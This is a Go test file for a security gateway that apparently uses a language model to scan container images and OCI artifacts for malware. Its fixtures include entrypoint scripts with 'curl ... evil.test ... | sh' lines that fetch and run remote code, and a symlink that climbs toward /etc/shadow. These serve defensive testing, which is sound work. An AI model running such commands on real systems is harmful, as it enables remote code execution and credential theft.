package llmpkgscan

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"sort"
	"strings"
	"sync"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// --- fixtures -----------------------------------------------------------------

// layerFile is one member of a test layer.
type layerFile struct {
	name string
	data string
	mode int64 // 0 selects 0644
	link string
}

// layer builds a gzip-compressed tar layer, members in the given order.
func layer(files ...layerFile) []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, f := range files {
		mode := f.mode
		if mode == 0 {
			mode = 0o644
		}
		if f.link != "" {
			_ = tw.WriteHeader(&tar.Header{Name: f.name, Typeflag: tar.TypeSymlink, Linkname: f.link, Mode: 0o777})
			continue
		}
		_ = tw.WriteHeader(&tar.Header{Name: f.name, Mode: mode, Size: int64(len(f.data)), Typeflag: tar.TypeReg})
		_, _ = io.WriteString(tw, f.data)
	}
	_ = tw.Close()
	_ = gw.Close()
	return buf.Bytes()
}

// testImage is an image held in memory: its manifest and every blob.
type testImage struct {
	manifest []byte
	config   string   // digest
	layers   []string // digests, manifest order (base first)
	blobs    map[string][]byte

	mu      sync.Mutex
	fetched map[string]int
	// fail, when set, makes the blob source fail for that digest; swap replaces
	// what it returns.
	fail map[string]error
	swap map[string][]byte
}

// newTestImage builds an image from a config document and its layers, base
// first. descriptor lets a test alter a layer's descriptor before the manifest
// is rendered.
func newTestImage(t *testing.T, config map[string]any, layers [][]byte, descriptor func(i int, d map[string]any)) *testImage {
	t.Helper()
	im := &testImage{blobs: map[string][]byte{}, fetched: map[string]int{}, fail: map[string]error{}, swap: map[string][]byte{}}
	cfg, err := json.Marshal(config)
	if err != nil {
		t.Fatal(err)
	}
	im.config = pkgscantest.Digest(cfg)
	im.blobs[im.config] = cfg
	manifest := map[string]any{
		"schemaVersion": 2,
		"mediaType":     "application/vnd.oci.image.manifest.v1+json",
		"config": map[string]any{
			"mediaType": "application/vnd.oci.image.config.v1+json",
			"digest":    im.config,
			"size":      len(cfg),
		},
	}
	var descs []map[string]any
	for i, l := range layers {
		d := pkgscantest.Digest(l)
		im.layers = append(im.layers, d)
		im.blobs[d] = l
		desc := map[string]any{
			"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
			"digest":    d,
			"size":      len(l),
		}
		if descriptor != nil {
			descriptor(i, desc)
		}
		descs = append(descs, desc)
	}
	manifest["layers"] = descs
	im.manifest, err = json.Marshal(manifest)
	if err != nil {
		t.Fatal(err)
	}
	return im
}

func (im *testImage) source() *ImageSource {
	return &ImageSource{Blob: func(_ context.Context, digest string, _ int64) (io.ReadCloser, error) {
		im.mu.Lock()
		defer im.mu.Unlock()
		im.fetched[digest]++
		if err := im.fail[digest]; err != nil {
			return nil, err
		}
		if b, ok := im.swap[digest]; ok {
			return io.NopCloser(bytes.NewReader(b)), nil
		}
		b, ok := im.blobs[digest]
		if !ok {
			return nil, errors.New("blob unknown to the test registry")
		}
		return io.NopCloser(bytes.NewReader(b)), nil
	}}
}

func (im *testImage) fetches(digest string) int {
	im.mu.Lock()
	defer im.mu.Unlock()
	return im.fetched[digest]
}

// request is the Assess request the gateway makes when the image's manifest is
// pulled.
func (im *testImage) request() Request {
	return Request{
		Artifact: Artifact{
			Ecosystem: "docker",
			Name:      "library/app",
			Version:   "1.0",
			Digest:    pkgscantest.Digest(im.manifest),
			Size:      int64(len(im.manifest)),
			Class:     ClassPayload,
		},
		Tenant: "team-a",
		Open:   pkgscantest.Opener(im.manifest, nil),
		Image:  im.source(),
	}
}

func imageConfig(entrypoint, cmd []string, env []string, history ...string) map[string]any {
	cfg := map[string]any{
		"architecture": "amd64",
		"os":           "linux",
		"config": map[string]any{
			"Entrypoint": entrypoint,
			"Cmd":        cmd,
			"Env":        env,
			"User":       "",
		},
		"rootfs": map[string]any{"type": "layers", "diff_ids": []string{"sha256:" + strings.Repeat("0", 64)}},
	}
	var steps []map[string]any
	for _, h := range history {
		steps = append(steps, map[string]any{"created_by": h})
	}
	cfg["history"] = steps
	return cfg
}

// benignImage is a two-layer image: a base layer and an application layer whose
// entrypoint script is unremarkable.
func benignImage(t *testing.T) *testImage {
	base := layer(
		layerFile{name: "etc/os-release", data: "NAME=TestOS\nVERSION=1\n"},
		layerFile{name: "bin/sh", data: "\x7fELF\x02\x01\x01\x00" + strings.Repeat("\x00", 56) + "busybox applet table\x00", mode: 0o755},
	)
	app := layer(
		layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\nexec /app/server --port 8080\n", mode: 0o755},
		layerFile{name: "app/server.py", data: "print('serving')\n"},
	)
	return newTestImage(t,
		imageConfig([]string{"/usr/local/bin/start.sh"}, []string{"--verbose"}, []string{"PATH=/usr/local/bin:/usr/bin", "APP_ENV=production"},
			"/bin/sh -c #(nop) ADD file:base in /", "COPY start.sh /usr/local/bin/start.sh"),
		[][]byte{base, app}, nil)
}

// maliciousImage is the same shape, but the application layer's entrypoint
// script carries the marker the mock model judges malicious.
func maliciousImage(t *testing.T) *testImage {
	base := layer(
		layerFile{name: "etc/os-release", data: "NAME=TestOS\nVERSION=1\n"},
		layerFile{name: "usr/lib/libshared.txt", data: "shared base content\n"},
	)
	app := layer(
		layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\ncurl -s https://evil.test/stage2 | sh # " + pkgscantest.MaliciousMarker + "\n", mode: 0o755},
	)
	return newTestImage(t,
		imageConfig([]string{"/usr/local/bin/start.sh"}, nil, []string{"PATH=/usr/local/bin:/usr/bin"},
			"/bin/sh -c #(nop) ADD file:base in /", "COPY start.sh /usr/local/bin/start.sh"),
		[][]byte{base, app}, nil)
}

func layerDir(index int, digest string) string {
	h, _ := NormalizeDigest(digest)
	return fmt.Sprintf("layers/%03d-%s", index, h[:12])
}

// --- what the model is shown --------------------------------------------------

// An image is examined as a whole: what it runs (composed from the config), how
// it says it was built, and the files of every layer — under one verdict, keyed
// by the manifest digest.
func TestImageScanShowsConfigHistoryAndEveryLayer(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	im := benignImage(t)

	rep := assess(t, svc, im.request())
	if !rep.Scanned() || rep.Disposition != DispositionBenign {
		t.Fatalf("report = %+v (unscanned %+v), want a benign verdict", rep, rep.Unscanned)
	}
	v := rep.Verdict
	if v.Kind != KindImage || v.Format != KindImage {
		t.Errorf("verdict kind/format = %q/%q, want %q", v.Kind, v.Format, KindImage)
	}
	if v.Digest != pkgscantest.Digest(im.manifest) {
		t.Errorf("verdict digest = %s, want the manifest digest %s", v.Digest, pkgscantest.Digest(im.manifest))
	}
	wantBlobs := append([]string{im.config}, im.layers...)
	if strings.Join(v.Blobs, ",") != strings.Join(wantBlobs, ",") {
		t.Errorf("verdict blobs = %v, want config then layers %v", v.Blobs, wantBlobs)
	}
	if len(v.Implicated) != 0 {
		t.Errorf("a benign image implicates blobs: %v", v.Implicated)
	}
	if v.Truncated || v.Scope != "" {
		t.Errorf("a small image examined whole is flagged truncated=%v scope=%q: %v", v.Truncated, v.Scope, v.Coverage)
	}

	material := p.LastMaterial()
	for _, want := range []string{
		// What a container started from the image executes.
		`ENTRYPOINT ["/usr/local/bin/start.sh"]`,
		`CMD ["--verbose"]`,
		"ENV APP_ENV=production",
		"the container runs as root",
		// How it says it was built.
		"COPY start.sh /usr/local/bin/start.sh",
		// The entrypoint's own content, from the layer that holds it.
		"exec /app/server --port 8080",
		layerDir(2, im.layers[1]) + "/usr/local/bin/start.sh",
		// The base layer is listed too.
		layerDir(1, im.layers[0]) + "/etc/os-release",
		layerDir(1, im.layers[0]) + "/bin/sh",
	} {
		if !strings.Contains(material, want) {
			t.Errorf("the model was not shown %q", want)
		}
	}
	// Every blob was fetched exactly once: the config and each layer.
	for _, d := range wantBlobs {
		if n := im.fetches(d); n != 1 {
			t.Errorf("blob %s fetched %d times, want once", d[:19], n)
		}
	}

	// A second pull of the same manifest costs nothing: no model call, no blob.
	calls := p.Calls()
	again := assess(t, svc, im.request())
	if !again.Cached || p.Calls() != calls {
		t.Errorf("second pull: cached=%v, model calls %d -> %d", again.Cached, calls, p.Calls())
	}
	for _, d := range wantBlobs {
		if n := im.fetches(d); n != 1 {
			t.Errorf("blob %s fetched again on a cached verdict (%d)", d[:19], n)
		}
	}
	if got := svc.Metrics().ScansByKind[KindImage]; got != 1 {
		t.Errorf("scans by kind[%s] = %d, want 1", KindImage, got)
	}
}

// The file an image's ENTRYPOINT names is what runs: it must be at the front of
// what the model reads, ahead of thousands of unremarkable files.
func TestImageEntrypointFileIsRankedFirst(t *testing.T) {
	var filler []layerFile
	for i := 0; i < 200; i++ {
		filler = append(filler, layerFile{name: fmt.Sprintf("usr/share/doc/pkg%03d/README", i), data: strings.Repeat("documentation text\n", 40)})
	}
	base := layer(filler...)
	app := layer(layerFile{name: "opt/run", data: "#!/bin/sh\necho started\n", mode: 0o755})
	im := newTestImage(t, imageConfig([]string{"/opt/run"}, nil, nil, "ADD base", "COPY run /opt/run"), [][]byte{base, app}, nil)

	tree, err := buildImageTree(context.Background(), im.manifest, *im.source(), DefaultLimits(), OversizeFail)
	if err != nil {
		t.Fatalf("buildImageTree: %v", err)
	}
	byScore := append([]*File(nil), tree.tree.Files...)
	sort.SliceStable(byScore, func(i, j int) bool { return byScore[i].Score > byScore[j].Score })
	top := map[string]bool{}
	for _, f := range byScore[:4] {
		top[f.Path] = true
	}
	entry := layerDir(2, im.layers[1]) + "/opt/run"
	for _, want := range []string{"image/run.txt", "image/history.txt", entry} {
		if !top[want] {
			t.Errorf("%s is not among the four highest-ranked files: %v", want, top)
		}
	}
	f, ok := tree.tree.Lookup(entry)
	if !ok || !strings.Contains(f.Role, "ENTRYPOINT") || !f.Exec {
		t.Errorf("entrypoint file = %+v, want it marked executable and named by the ENTRYPOINT", f)
	}
	for _, name := range []string{"image/run.txt", "image/history.txt", "image/config.json", "image/manifest.json"} {
		f, ok := tree.tree.Lookup(name)
		if !ok || !f.Synthetic {
			t.Errorf("%s: present=%v synthetic=%v, want a proxy-composed entry", name, ok, ok && f.Synthetic)
		}
	}
}

// --- verdicts and blobs ---------------------------------------------------------

// A malicious image is refused at the manifest, and so are the blobs the verdict
// holds something against: the config (unique to the image) and the layer the
// evidence cites. The base layer it shares with every other image built on it is
// not refused — otherwise publishing malware on top of a popular base image
// would take that base image offline for everyone.
func TestMaliciousImageImplicatesItsConfigAndTheCitedLayerOnly(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	im := maliciousImage(t)
	ctx := context.Background()

	rep := assess(t, svc, im.request())
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("disposition = %s (unscanned %+v), want malicious", rep.Disposition, rep.Unscanned)
	}
	if d := svc.Gate(rep); d.Served() || !d.Evict {
		t.Fatalf("decision = %+v, want the manifest refused and evicted", d)
	}
	v := rep.Verdict
	if len(v.Evidence) == 0 || !strings.HasPrefix(v.Evidence[0].Path, layerDir(2, im.layers[1])+"/") || !v.Evidence[0].Verified {
		t.Fatalf("evidence = %+v, want a verified citation inside the application layer", v.Evidence)
	}
	want := []string{im.config, im.layers[1]}
	got := append([]string(nil), v.Implicated...)
	sort.Strings(got)
	sort.Strings(want)
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("implicated = %v, want the config and the application layer %v", v.Implicated, want)
	}

	for name, digest := range map[string]string{"config": im.config, "application layer": im.layers[1]} {
		st := svc.BlobStatus(ctx, digest)
		if !st.Covered || !st.Refused || st.Verdict == nil || st.Verdict.Key != v.Key {
			t.Errorf("%s: status = %+v, want it refused by the image's verdict", name, st)
		}
	}
	base := svc.BlobStatus(ctx, im.layers[0])
	if !base.Covered || base.Refused {
		t.Errorf("shared base layer: status = %+v, want covered and NOT refused", base)
	}
	// A blob no image verdict knows is neither: it gets examined on its own.
	if st := svc.BlobStatus(ctx, "sha256:"+strings.Repeat("ab", 32)); st.Covered || st.Refused {
		t.Errorf("unknown blob: status = %+v, want neither covered nor refused", st)
	}
	if st := svc.BlobStatus(ctx, "not-a-digest"); st.Covered || st.Refused {
		t.Errorf("malformed digest: status = %+v", st)
	}

	// The stored verdict is found by the manifest's digest, and a report built
	// from it for a blob carries the same refusal.
	stored, standing, ok := svc.StoredVerdict(ctx, pkgscantest.Digest(im.manifest))
	if !ok || stored.Key != v.Key || !standing.Refused {
		t.Fatalf("StoredVerdict = %+v / %+v / %v, want the refused image verdict", stored, standing, ok)
	}
	blobReport := svc.ReportFor(Artifact{Ecosystem: "docker", Name: "library/app", Digest: im.layers[1]}, stored)
	if blobReport == nil || !blobReport.Cached || blobReport.Disposition != DispositionMalicious || svc.Gate(blobReport).Served() {
		t.Errorf("ReportFor a blob of the image = %+v, want a refusal without a scan", blobReport)
	}
	if blobReport.Artifact.Digest != im.layers[1] {
		t.Errorf("the blob's report names digest %s, want the blob's own %s", blobReport.Artifact.Digest, im.layers[1])
	}
}

// Refusal follows the action that is configured now, not the one in force when
// the image was scanned: under annotate nothing is refused, blobs included.
func TestImageBlobRefusalFollowsTheAction(t *testing.T) {
	for _, tc := range []struct {
		action  Action
		refused bool
	}{
		{ActionAnnotate, false},
		{ActionBlock, true},
		{ActionQuarantine, true},
	} {
		t.Run(string(tc.action), func(t *testing.T) {
			svc := newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Action = tc.action })
			im := maliciousImage(t)
			assess(t, svc, im.request())
			for _, d := range []string{im.config, im.layers[1]} {
				if st := svc.BlobStatus(context.Background(), d); st.Refused != tc.refused || !st.Covered {
					t.Errorf("blob %s: status = %+v, want refused=%v", d[:19], st, tc.refused)
				}
			}
		})
	}
}

// The blob index is rebuilt from the stored verdicts: a restart must not turn a
// refused layer back into a downloadable one.
func TestImageBlobIndexSurvivesARestart(t *testing.T) {
	dir := t.TempDir()
	im := maliciousImage(t)
	open := func() (*Service, *FileStore) {
		store, err := NewFileStore(dir)
		if err != nil {
			t.Fatal(err)
		}
		svc := newService(t, &pkgscantest.Provider{}, func(c *Config) { c.Store = store })
		return svc, store
	}
	first, store := open()
	assess(t, first, im.request())
	_ = first.Close()
	_ = store.Close()

	second, store2 := open()
	defer store2.Close()
	for _, d := range []string{im.config, im.layers[1]} {
		if st := second.BlobStatus(context.Background(), d); !st.Refused {
			t.Errorf("after a restart blob %s is no longer refused: %+v", d[:19], st)
		}
	}
	if st := second.BlobStatus(context.Background(), im.layers[0]); !st.Covered || st.Refused {
		t.Errorf("after a restart the base layer's status = %+v, want covered and not refused", st)
	}
}

// The image verdict and a reading of the manifest as a plain file are different
// verdicts under different keys: neither may stand in for the other.
func TestImageVerdictIsNotSharedWithTheManifestReadAsAFile(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	im := maliciousImage(t)

	// The manifest, pulled through something that does not know it is an image:
	// a JSON document, examined as the single file it is. Nothing in it is
	// malicious.
	plain := im.request()
	plain.Image = nil
	plain.Artifact.SingleFile = true
	plain.Artifact.Filename = "manifest.json"
	asFile := assess(t, svc, plain)
	if asFile.Disposition != DispositionBenign || asFile.Verdict.Kind != KindFile {
		t.Fatalf("manifest as a file = %s / kind %q, want a benign single-file verdict", asFile.Disposition, asFile.Verdict.Kind)
	}

	// The same bytes pulled as an image must be scanned as an image, not answered
	// from the file verdict.
	asImage := assess(t, svc, im.request())
	if asImage.Cached || asImage.Disposition != DispositionMalicious || asImage.Verdict.Kind != KindImage {
		t.Fatalf("manifest as an image = cached %v, %s, kind %q; want a fresh malicious image verdict", asImage.Cached, asImage.Disposition, asImage.Verdict.Kind)
	}
	if asFile.Verdict.Key == asImage.Verdict.Key {
		t.Error("the image verdict and the file verdict share a cache key")
	}

	// Looked up by digest alone, the worse reading wins.
	_, standing, ok := svc.StoredVerdict(context.Background(), pkgscantest.Digest(im.manifest))
	if !ok || !standing.Refused {
		t.Errorf("StoredVerdict = %+v / %v, want the refusing image verdict to win over the benign file verdict", standing, ok)
	}
}

// --- what is not an image -------------------------------------------------------

// A manifest list names other manifests and holds nothing to run. The manifest a
// client selects from it is examined when that one is pulled.
func TestImageIndexIsNotExamined(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	index := []byte(`{"schemaVersion":2,"mediaType":"application/vnd.oci.image.index.v1+json","manifests":[{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:` + strings.Repeat("a", 64) + `","size":7143,"platform":{"architecture":"amd64","os":"linux"}}]}`)
	fetched := 0
	req := Request{
		Artifact: Artifact{Ecosystem: "docker", Name: "library/app", Version: "latest", Digest: pkgscantest.Digest(index), Size: int64(len(index)), Class: ClassPayload},
		Open:     pkgscantest.Opener(index, nil),
		Image: &ImageSource{Blob: func(context.Context, string, int64) (io.ReadCloser, error) {
			fetched++
			return nil, errors.New("an index has no blobs to fetch")
		}},
	}
	for i := 0; i < 2; i++ {
		rep, err := svc.Assess(context.Background(), req)
		if err != nil || rep != nil {
			t.Fatalf("pull %d: Assess = %+v, %v; want no report (nothing to examine)", i+1, rep, err)
		}
	}
	if p.Calls() != 0 || fetched != 0 {
		t.Errorf("an image index cost %d model calls and %d blob fetches", p.Calls(), fetched)
	}

	blobs, isIndex, err := ParseImageManifest(index)
	if err != nil || !isIndex || len(blobs) != 0 {
		t.Errorf("ParseImageManifest(index) = %v, %v, %v", blobs, isIndex, err)
	}
}

// An OCI artifact that is a signature or an attestation — an empty config and a
// JSON payload layer — is stored like an image and is not one: nothing in it is
// unpacked or run.
func TestOCIArtifactThatIsNotAnImageIsNotExamined(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	payload := []byte(`{"critical":{"identity":{"docker-reference":"registry.example/app"},"image":{"docker-manifest-digest":"sha256:` + strings.Repeat("b", 64) + `"},"type":"cosign container image signature"}}`)
	im := newTestImage(t, map[string]any{}, [][]byte{payload}, func(_ int, d map[string]any) {
		d["mediaType"] = "application/vnd.dev.cosign.simplesigning.v1+json"
	})
	rep, err := svc.Assess(context.Background(), im.request())
	if err != nil || rep != nil {
		t.Fatalf("Assess(signature artifact) = %+v, %v; want no report", rep, err)
	}
	if p.Calls() != 0 {
		t.Errorf("a signature artifact cost %d model calls", p.Calls())
	}
}

// An OCI artifact whose layer IS something to run — a WebAssembly module, a
// Helm chart, a script — is examined, image config or not.
func TestOCIArtifactCarryingAPayloadIsExamined(t *testing.T) {
	p := &pkgscantest.Provider{}
	svc := newService(t, p, nil)
	chart := pkgscantest.TarGz(map[string]string{
		"chart/Chart.yaml":            "apiVersion: v2\nname: chart\nversion: 1.0.0\n",
		"chart/templates/hook.yaml":   "# " + pkgscantest.MaliciousMarker + "\nkind: Job\n",
		"chart/templates/_helper.tpl": "{{/* helper */}}\n",
	})
	im := newTestImage(t, map[string]any{"name": "chart", "version": "1.0.0"}, [][]byte{chart}, func(_ int, d map[string]any) {
		d["mediaType"] = "application/vnd.cncf.helm.chart.content.v1.tar+gzip"
	})
	rep := assess(t, svc, im.request())
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("a Helm chart stored as an OCI artifact was judged %s (unscanned %+v), want malicious", rep.Disposition, rep.Unscanned)
	}
	if !strings.Contains(p.LastMaterial(), "chart/templates/hook.yaml") {
		t.Error("the chart's files were not shown to the model")
	}
}

// --- failure is never a pass ----------------------------------------------------

func TestImageWhoseBlobsCannotBeTrustedGetsNoVerdict(t *testing.T) {
	cases := []struct {
		name   string
		break_ func(im *testImage)
		code   string
	}{
		{"a layer that is not the bytes its digest names", func(im *testImage) {
			im.swap[im.layers[1]] = layer(layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\necho harmless\n"})
		}, CodeDigestMismatch},
		{"a config that is not the bytes its digest names", func(im *testImage) {
			im.swap[im.config] = []byte(`{"architecture":"amd64","os":"linux","config":{"Entrypoint":["/bin/true"]},"rootfs":{"type":"layers","diff_ids":["sha256:x"]}}`)
		}, CodeDigestMismatch},
		{"a layer the registry will not serve", func(im *testImage) {
			im.fail[im.layers[0]] = errors.New("503 from the registry")
		}, CodeUnavailable},
		{"a config the registry will not serve", func(im *testImage) {
			im.fail[im.config] = errors.New("404")
		}, CodeUnavailable},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := &pkgscantest.Provider{}
			svc := newService(t, p, func(c *Config) { c.FailMode = FailClosed })
			im := maliciousImage(t)
			tc.break_(im)
			rep := assess(t, svc, im.request())
			if rep.Scanned() || rep.Unscanned == nil || rep.Unscanned.Code != tc.code {
				t.Fatalf("report = %+v (unscanned %+v), want unscanned with code %s", rep, rep.Unscanned, tc.code)
			}
			if d := svc.Gate(rep); d.Served() {
				t.Errorf("an image that could not be examined was served under fail-closed: %+v", d)
			}
			if p.Calls() != 0 {
				t.Errorf("the model was asked about an image whose blobs could not be trusted (%d calls)", p.Calls())
			}
			// Nothing was recorded against its blobs either.
			if st := svc.BlobStatus(context.Background(), im.layers[1]); st.Covered || st.Refused {
				t.Errorf("blob status after a failed image scan = %+v, want none", st)
			}
		})
	}
}

func TestMalformedManifestIsUnsupportedNotClean(t *testing.T) {
	for name, manifest := range map[string]string{
		"not JSON":             `this is not a manifest`,
		"schema 1":             `{"schemaVersion":1,"name":"app","fsLayers":[{"blobSum":"sha256:` + strings.Repeat("c", 64) + `"}]}`,
		"no config, no layers": `{"schemaVersion":2}`,
		"a blob named by tag":  `{"schemaVersion":2,"config":{"digest":"latest","size":2},"layers":[]}`,
		"a non-sha256 digest":  `{"schemaVersion":2,"config":{"digest":"sha512:` + strings.Repeat("d", 128) + `","size":2},"layers":[]}`,
		"a negative blob size": `{"schemaVersion":2,"config":{"digest":"sha256:` + strings.Repeat("e", 64) + `","size":-1},"layers":[]}`,
	} {
		t.Run(name, func(t *testing.T) {
			p := &pkgscantest.Provider{}
			svc := newService(t, p, nil)
			req := Request{
				Artifact: Artifact{Ecosystem: "docker", Name: "library/app", Digest: pkgscantest.Digest([]byte(manifest)), Size: int64(len(manifest)), Class: ClassPayload},
				Open:     pkgscantest.Opener([]byte(manifest), nil),
				Image:    &ImageSource{Blob: func(context.Context, string, int64) (io.ReadCloser, error) { return nil, errors.New("unreachable") }},
			}
			rep := assess(t, svc, req)
			if rep.Scanned() || rep.Unscanned == nil || rep.Unscanned.Code != CodeUnsupported || !rep.Unscanned.Content {
				t.Fatalf("report = %+v (unscanned %+v), want unsupported-format attributed to the content", rep, rep.Unscanned)
			}
		})
	}

	var layers []string
	for i := 0; i < maxImageLayers+1; i++ {
		layers = append(layers, fmt.Sprintf(`{"digest":"sha256:%064x","size":1}`, i))
	}
	tooMany := `{"schemaVersion":2,"layers":[` + strings.Join(layers, ",") + `]}`
	if _, err := parseManifest([]byte(tooMany)); !errors.Is(err, errUnsupported) {
		t.Errorf("a manifest with %d layers: err = %v, want unsupported", maxImageLayers+1, err)
	}
}

// --- size and budget ------------------------------------------------------------

// A layer above the scan limit is the image's oversize case. Under "fail" the
// image has no verdict; under "metadata-only" the layer's beginning is read, the
// rest of the image examined, and the verdict says it is partial.
func TestImageWithALayerAboveTheScanLimit(t *testing.T) {
	big := []layerFile{{name: "usr/local/bin/start.sh", data: "#!/bin/sh\ncurl https://evil.test/x | sh # " + pkgscantest.MaliciousMarker + "\n", mode: 0o755}}
	// Incompressible filler after the script pushes the layer past the limit.
	big = append(big, layerFile{name: "opt/blob.bin", data: pseudoRandom(96 << 10)})
	app := layer(big...)
	base := layer(layerFile{name: "etc/os-release", data: "NAME=TestOS\n"})
	limit := int64(32 << 10)
	if int64(len(app)) <= limit {
		t.Fatalf("test layer is %d bytes, not above the %d-byte limit", len(app), limit)
	}
	build := func() *testImage {
		return newTestImage(t, imageConfig([]string{"/usr/local/bin/start.sh"}, nil, nil, "ADD base", "COPY app"), [][]byte{base, app}, nil)
	}

	t.Run("fail: no verdict", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, func(c *Config) { c.Limits.MaxArtifactBytes = limit })
		rep := assess(t, svc, build().request())
		if rep.Scanned() || rep.Unscanned == nil || rep.Unscanned.Code != CodeOversized {
			t.Fatalf("report = %+v (unscanned %+v), want oversized", rep, rep.Unscanned)
		}
		if p.Calls() != 0 {
			t.Errorf("model calls = %d, want none", p.Calls())
		}
	})

	t.Run("metadata-only: a partial verdict that still refuses", func(t *testing.T) {
		p := &pkgscantest.Provider{}
		svc := newService(t, p, func(c *Config) {
			c.Limits.MaxArtifactBytes = limit
			c.Oversize = OversizeMetadataOnly
		})
		im := build()
		rep := assess(t, svc, im.request())
		if !rep.Scanned() {
			t.Fatalf("no verdict: %+v", rep.Unscanned)
		}
		v := rep.Verdict
		if v.Scope != ScopeMetadataOnly || !v.Truncated {
			t.Errorf("scope = %q truncated = %v, want a metadata-only verdict flagged truncated", v.Scope, v.Truncated)
		}
		if rep.Disposition != DispositionMalicious || svc.Gate(rep).Served() {
			t.Errorf("disposition = %s; a malicious metadata-only verdict must be enforced like any other", rep.Disposition)
		}
		if !strings.Contains(strings.Join(v.Coverage, " "), "partially examined") {
			t.Errorf("coverage does not name the partly examined layer: %v", v.Coverage)
		}
		found := false
		for _, f := range rep.Findings {
			if f.RuleID == RuleScanIncomplete {
				found = true
			}
		}
		if !found {
			t.Errorf("no %s finding on a metadata-only verdict: %+v", RuleScanIncomplete, rep.Findings)
		}
		if svc.Metrics().MetadataOnly != 1 {
			t.Errorf("metadata-only scans = %d, want 1", svc.Metrics().MetadataOnly)
		}
	})
}

// The member budget is shared by the whole image and spent top-most layer
// first: what this image added is examined, and a base layer that no longer
// fits is named as not examined rather than silently dropped.
func TestImageBudgetIsSpentOnTheTopLayersFirst(t *testing.T) {
	var baseFiles []layerFile
	for i := 0; i < 40; i++ {
		baseFiles = append(baseFiles, layerFile{name: fmt.Sprintf("usr/share/base/file%02d", i), data: "base\n"})
	}
	base := layer(baseFiles...)
	middle := layer(layerFile{name: "opt/middle.txt", data: "middle\n"})
	app := layer(
		layerFile{name: "usr/local/bin/start.sh", data: "#!/bin/sh\necho hi\n", mode: 0o755},
		layerFile{name: "app/a.txt", data: "a\n"},
		layerFile{name: "app/b.txt", data: "b\n"},
	)
	im := newTestImage(t, imageConfig([]string{"/usr/local/bin/start.sh"}, nil, nil, "ADD base", "COPY middle", "COPY app"), [][]byte{base, middle, app}, nil)

	lim := DefaultLimits()
	lim.MaxFiles = 12 // four composed entries + the top layer's three + a few
	built, err := buildImageTree(context.Background(), im.manifest, *im.source(), lim, OversizeFail)
	if err != nil {
		t.Fatalf("buildImageTree: %v", err)
	}
	tree := built.tree
	for _, want := range []string{
		layerDir(3, im.layers[2]) + "/usr/local/bin/start.sh",
		layerDir(3, im.layers[2]) + "/app/a.txt",
		layerDir(2, im.layers[1]) + "/opt/middle.txt",
	} {
		if _, ok := tree.Lookup(want); !ok {
			t.Errorf("%s is missing: the layers this image added must be examined first", want)
		}
	}
	facts := tree.Image.Layers
	if len(facts) != 3 || facts[2].Coverage != "examined" || facts[1].Coverage != "examined" {
		t.Fatalf("layer coverage = %+v, want the top two layers examined", facts)
	}
	if facts[0].Coverage == "examined" {
		t.Errorf("the base layer has %d members and cannot fit a %d-member budget, yet it is reported examined", len(baseFiles), lim.MaxFiles)
	}
	if !tree.Truncated() || !strings.Contains(strings.Join(tree.Notes, " "), "layer 1") {
		t.Errorf("the tree does not say that layer 1 went unexamined: %v", tree.Notes)
	}
	if len(tree.Files) > lim.MaxFiles+4 {
		t.Errorf("tree holds %d files against a budget of %d", len(tree.Files), lim.MaxFiles)
	}
}

// A foreign layer is one the registry does not hold: the client fetches it from
// a URL in the manifest. It is not fetched by the scan, and the verdict says the
// image was not examined in full.
func TestForeignLayerIsNamedAndNotFetched(t *testing.T) {
	foreign := layer(layerFile{name: "Windows/System32/kernel32.dll", data: "MZ"})
	app := layer(layerFile{name: "app/run.cmd", data: "echo hi\n"})
	im := newTestImage(t, imageConfig([]string{"app/run.cmd"}, nil, nil, "base", "COPY app"), [][]byte{foreign, app}, func(i int, d map[string]any) {
		if i == 0 {
			d["mediaType"] = "application/vnd.docker.image.rootfs.foreign.diff.tar.gzip"
			d["urls"] = []string{"https://mcr.example/layer"}
		}
	})
	built, err := buildImageTree(context.Background(), im.manifest, *im.source(), DefaultLimits(), OversizeFail)
	if err != nil {
		t.Fatalf("buildImageTree: %v", err)
	}
	if n := im.fetches(im.layers[0]); n != 0 {
		t.Errorf("the foreign layer was fetched %d times", n)
	}
	if c := built.tree.Image.Layers[0].Coverage; !strings.Contains(c, "foreign") {
		t.Errorf("foreign layer coverage = %q", c)
	}
	if !built.tree.Truncated() {
		t.Error("an image with an unexamined foreign layer is not flagged as partly examined")
	}
	// It is still one of the image's blobs.
	if len(built.blobs) != 3 {
		t.Errorf("blobs = %v, want config + 2 layers", built.blobs)
	}
}

// A link in a layer is judged as part of a root filesystem: an absolute target
// is how links are written there. A relative one climbing above the root is not.
func TestImageLayerLinksAreJudgedAsARootFilesystem(t *testing.T) {
	app := layer(
		layerFile{name: "usr/bin/vi", link: "/etc/alternatives/vi"},
		layerFile{name: "usr/lib/libz.so", link: "libz.so.1"},
		layerFile{name: "opt/escape", link: "../../../../host/etc/shadow"},
		layerFile{name: "opt/run.sh", data: "#!/bin/sh\n", mode: 0o755},
	)
	im := newTestImage(t, imageConfig([]string{"/opt/run.sh"}, nil, nil, "COPY app"), [][]byte{app}, nil)
	built, err := buildImageTree(context.Background(), im.manifest, *im.source(), DefaultLimits(), OversizeFail)
	if err != nil {
		t.Fatalf("buildImageTree: %v", err)
	}
	escapes := map[string]bool{}
	for _, l := range built.tree.Links {
		escapes[l.Target] = l.Escapes
	}
